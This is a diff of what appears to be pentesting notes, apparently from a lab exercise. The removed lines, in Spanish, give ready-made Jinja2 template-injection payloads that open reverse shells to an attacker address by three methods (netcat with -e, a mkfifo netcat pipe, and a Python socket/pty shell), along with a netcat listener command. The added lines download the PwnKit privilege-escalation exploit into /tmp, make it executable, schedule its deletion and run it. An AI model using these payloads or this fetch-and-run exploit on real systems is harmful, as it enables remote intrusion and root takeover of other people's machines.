@@ -1,18 +1,4 @@
-Payloads listos con tu IP atacante 192.168.49.52 y puerto 1234
-1. Netcat con -e (si existe esa versión en la víctima)
-{{ cycler.__init__.__globals__.os.popen("nc -e /bin/bash 192.168.49.52 1234") }}
-
-2. Netcat sin -e (más común)
-{{ cycler.__init__.__globals__.os.popen("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.49.52 1234 > /tmp/f") }}
-
-3. Python reverse shell (muy estable)
-{{ cycler.__init__.__globals__.__builtins__.__import__('os').system("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.168.49.52\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'") }}
-
-En tu Kali (atacante)
-
-Ejecuta:
-
-nc -lvnp 1234
-
-
-y espera la conexión.
+curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o /tmp/PwnKit || exit
+chmod +x /tmp/PwnKit || exit
+(sleep 1 && rm /tmp/PwnKit & )
+/tmp/PwnKit
